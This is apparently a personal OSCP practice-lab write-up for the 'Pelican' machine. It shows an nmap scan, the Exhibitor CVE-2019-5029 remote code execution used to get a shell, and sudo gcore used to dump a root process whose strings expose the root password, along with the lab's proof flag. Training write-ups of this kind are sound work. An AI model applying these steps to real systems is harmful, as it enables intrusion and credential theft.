# Pelican

Nmap: 

```html
┌──(kali㉿kali)-[~/OSCP/Labs/PracticeGrounds/Pelican]
└─$ sudo nmap -sC -sV -p1-10000 192.168.201.98 -o nmap
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-13 19:41 AEDT
Stats: 0:01:37 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 62.45% done; ETC: 19:43 (0:00:58 remaining)
Stats: 0:02:21 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 94.11% done; ETC: 19:43 (0:00:00 remaining)
Nmap scan report for 192.168.201.98
Host is up (0.35s latency).
Not shown: 9992 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
631/tcp  open  ipp         CUPS 2.2
|_http-title: Forbidden - CUPS v2.2.10
|_http-server-header: CUPS/2.2 IPP/2.1
| http-methods: 
|_  Potentially risky methods: PUT
2181/tcp open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
8080/tcp open  http        Jetty 1.0
|_http-server-header: Jetty(1.0)
|_http-title: Error 404 Not Found
8081/tcp open  http        nginx 1.14.2
|_http-title: Did not follow redirect to http://192.168.201.98:8080/exhibitor/v1/ui/index.html
|_http-server-header: nginx/1.14.2
Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-12-13T08:43:29
|_  start_date: N/A
|_clock-skew: mean: 1h39m59s, deviation: 2h53m13s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: pelican
|   NetBIOS computer name: PELICAN\x00
|   Domain name: \x00
|   FQDN: pelican
|_  System time: 2025-12-13T03:43:27-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 157.18 seconds

```

Software and version list:

```html
Jetty 1.0
Zookeeper 3.4.6-1569965
CUPS/2.2
```

Visited the HTTP service on port 8080

Using server is running Zookeeper with version 1.0 for the UI 

![image.png](Pelican/57df2651-78a5-41fd-9e80-08abb8f48d9a.png)

A search for exploits and I found a vulnerbiltiy within the config page:

- https://x7331.gitbook.io/boxes/services/tcp/2181-zookeeper
- https://www.exploit-db.com/exploits/48654

RCE vulnerability ([CVE-2019-5029](https://nvd.nist.gov/vuln/detail/CVE-2019-5029))

The **Java.env script** field is vulnerable:  ****

![Screenshot 2025-12-13 at 8.59.07 pm.png](Pelican/Screenshot_2025-12-13_at_8.59.07_pm.png)

After committing the changes we were able to get a reverse shell on the host: 

![Screenshot 2025-12-13 at 9.01.26 pm.png](Pelican/Screenshot_2025-12-13_at_9.01.26_pm.png)

We stabilised the shell using: 

```html
python -c 'import pty; pty.spawn("/bin/bash")'
```

We looked around for way to priv esc and came across an file that can be run with root privileges: 

```html
charles@pelican:/opt/zookeeper$ sudo -l
sudo -l
Matching Defaults entries for charles on pelican:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore
charles@pelican:/opt/zookeeper$ 
```

After some research we found the gcore is used for dumping running processes 

We can than use the ‘strings’ command to find important information within the processes 

We used ps aux to look for running processes that looked interesting: 

```html
root       465  0.0  0.5 398424 11796 ?        Ssl  03:36   0:00 /usr/lib/udisks2/udisksd
root       466  0.0  0.3  19528  7376 ?        Ss   03:36   0:00 /lib/systemd/systemd-logind
root       469  0.0  0.1   9468  2404 ?        S    03:36   0:00 /usr/sbin/CRON -f
root       487  0.0  0.0   2388  1608 ?        Ss   03:36   0:00 /bin/sh -c while true; do chown -R charles:charles /opt/zookeeper && chown -R charles:charles /opt/exhibitor && sleep 1; done
avahi      504  0.0  0.0   8156   324 ?        S    03:36   0:00 avahi-daemon: chroot helper
root       512  0.0  0.3 235840  6660 ?        Ssl  03:36   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       513  0.0  0.0   2276    72 ?        Ss   03:36   0:00 /usr/bin/password-store
root       514  0.0  0.5 184976 11000 ?        Ssl  03:36   0:00 /usr/sbin/cups-browsed
root       554  0.0  0.3 313364  7004 ?        Ssl  03:36   0:00 /usr/sbin/lightdm
root       557  0.0  0.3  15852  6988 ?        Ss   03:36   0:00 /usr/sbin/sshd -D
root       581  0.0  0.0   5612  1712 tty1     Ss+  03:36   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       582  0.0  2.2 224980 46204 tty7     Ssl+ 03:36   0:00 /usr/lib/xorg/Xorg :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
root       584  0.0  0.0  69740  1704 ?        Ss   03:36   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
root       636  0.0  0.4 105128  9628 ?        Ssl  03:36   0:00 /usr/sbin/cupsd -l
root       657  0.0  0.3 166792  7220 ?        Sl   03:36   0:00 lightdm --session-child 18 21
root       720  0.0  0.2  18748  5276 ?        S    03:36   0:00 lightdm --session-child 14 21
root      1322  0.0  1.0  50144 21272 ?        Ss   03:38   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1324  0.0  0.2  46672  5932 ?        S    03:38   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1325  0.0  0.2  46680  5968 ?        S    03:38   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1327  0.0  0.3  50136  7136 ?        S    03:38   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1680  0.0  0.7 258856 15164 ?        Ssl  03:38   0:00 /usr/sbin/NetworkManager --no-daemon
root      3007  0.0  0.0      0     0 ?        I    03:43   0:00 [kworker/u2:1-events_unbound]
charles  10977  0.1  3.7 2547784 75944 ?       Sl   04:11   0:03 java -Dzookeeper.log.dir=. -Dzookeeper.root.logger=INFO,CONSOLE -cp /opt/zookeeper/bin/../build/classes:/opt/zookeeper/bin/../build/lib/*.jar:/opt/zookeeper/bin/../lib/slf4j-log4j12-1.6.1.jar:/opt/zookeeper/bin/../lib/slf4j-api-1.6.1.jar:/opt/zookeeper/bin/../lib/netty-3.7.0.Final.jar:/opt/zookeeper/bin/../lib/log4j-1.2.16.jar:/opt/zookeeper/bin/../lib/jline-0.9.94.jar:/opt/zookeeper/bin/../zookeeper-3.4.6.jar:/opt/zookeeper/bin/../src/java/lib/*.jar:/opt/zookeeper/bin/../conf: -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.local.only=false org.apache.zookeeper.server.quorum.QuorumPeerMain /opt/zookeeper/bin/../conf/zoo.cfg
root     16135  0.0  0.0      0     0 ?        I    04:30   0:00 [kworker/0:1-ata_sff]
root     17562  0.0  0.0      0     0 ?        I    04:35   0:00 [kworker/0:0-ata_sff]
root     18366  0.0  0.0   5260   752 ?        S    04:38   0:00 sleep 1
charles  18368  0.0  0.0   6076   892 pts/1    S+   04:38   0:00 grep root

```

One particular process stood out: 

```html
root       513    0:00 /usr/bin/password-store
```

```html
charles@pelican:/opt/zookeeper$ sudo gcore 513
sudo gcore 513
0x00007f971bd1c6f4 in __GI___nanosleep (requested_time=requested_time@entry=0x7ffc3d7a2c80, remaining=remaining@entry=0x7ffc3d7a2c80) at ../sysdeps/unix/sysv/linux/nanosleep.c:28
28 ../sysdeps/unix/sysv/linux/nanosleep.c: No such file or directory.
Saved corefile core.513
[Inferior 1 (process 513) detached]
charles@pelican:/opt/zookeeper$ ls
ls
bin          core.513         lib                   version-2
build.xml    data             LICENSE.txt           zookeeper-3.4.6.jar
CHANGES.txt  dist-maven       NOTICE.txt            zookeeper-3.4.6.jar.asc
conf         docs             README_packaging.txt  zookeeper-3.4.6.jar.md5
contrib      here             README.txt            zookeeper-3.4.6.jar.sha1
core.11023   ivysettings.xml  recipes               zookeeper.out
core.1322    ivy.xml          src
charles@pelican:/opt/zookeeper$ strings core.513 > here
strings core.513 > here
charles@pelican:/opt/zookeeper$ cat here
cat here
CORE
password-store
/usr/bin/password-store 
CORE
x,z=
CORE
MSlU
LSlU
LSlU
LSlU
LSlU
LSlU
LSlU
KSlU
/usr/bin/passwor
////////////////
LINUX
/usr/bin/passwor
////////////////
IGISCORE
CORE
ELIFCORE
/usr/bin/password-store
/usr/bin/password-store
/usr/lib/x86_64-linux-gnu/libc-2.28.so
/usr/lib/x86_64-linux-gnu/libc-2.28.so
/usr/lib/x86_64-linux-gnu/ld-2.28.so
/usr/lib/x86_64-linux-gnu/ld-2.28.so
fork failed!
/tmp
;*3$"
aliases
ethers
group
gshadow
hosts
initgroups
netgroup
networks
passwd
protocols
publickey
services
shadow
CAk[S
N?z=
E?z=
libc.so.6
/lib/x86_64-linux-gnu
libc.so.6
P-z=
;*3$"
P.z=
sse2
x86_64
avx512_1
i586
i686
haswell
xeon_phi
linux-vdso.so.1
tls/x86_64/x86_64/tls/x86_64/
/lib/x86_64-linux-gnu/libc.so.6
P z=
8!z=
P z=
P z=
p&z=
p&z=
p&z=
@&z=
h'z=
0+z=
 +z=
 +z=
@(z=
(+z=
/usr/bin/passwor
////////////////
/usr/bin/passwor
////////////////
////////////////
`,z=
@-z=
@-z=
 -z=
**001 Password: root:
ClogKingpinInning731**
E?z=
]?z=
h?z=
u?z=
x86_64
/usr/bin/password-store
HOME=/root
LOGNAME=root
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
LANG=en_US.UTF-8
SHELL=/bin/sh
PWD=/root
/usr/bin/password-store
bemX
__vdso_clock_gettime
__vdso_gettimeofday
__vdso_time
__vdso_getcpu
linux-vdso.so.1
LINUX_2.6
Linux
Linux
4.19.0-10-amd64
AVAUATSH
[A\A]A^]
D9+u
[A\A]A^]
D9#u
H+=x
H#=y
H+=K
H#=L
AVAUATI
[A\A]A^]
GCC: (Debian 8.3.0-6) 8.3.0
.shstrtab
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_d
.dynamic
.rodata
.note
.eh_frame_hdr
.eh_frame
.text
.altinstructions
.altinstr_replacement
.comment
.shstrtab
note0
load
                           
```

The password was there in plaintext:

```html
charles@pelican:/opt/zookeeper$ su root
su root
Password: ClogKingpinInning731

root@pelican:/opt/zookeeper# ls
ls
bin      core.513       lib       version-2
build.xml    data       LICENSE.txt     zookeeper-3.4.6.jar
CHANGES.txt  dist-maven       NOTICE.txt     zookeeper-3.4.6.jar.asc
conf      docs       README_packaging.txt  zookeeper-3.4.6.jar.md5
contrib      here       README.txt     zookeeper-3.4.6.jar.sha1
core.11023   ivysettings.xml  recipes      zookeeper.out
core.1322    ivy.xml       src
root@pelican:/opt/zookeeper# cd /
cd /
root@pelican:/# ls
ls
bin   home       lib32   media  root  sys  vmlinuz
boot  initrd.img      lib64   mnt  run   tmp  vmlinuz.old
dev   initrd.img.old  libx32    opt  sbin  usr  zookeeper
etc   lib       lost+found  proc  srv   var
root@pelican:/# cd root
cd root
root@pelican:~# ls
ls
Desktop    Downloads  Pictures  Public     Videos
Documents  Music      proof.txt  Templates
root@pelican:~# cat proof.txt
cat proof.txt
b887826809b38c363d8bec36d80f6393
root@pelican:~# ^C
```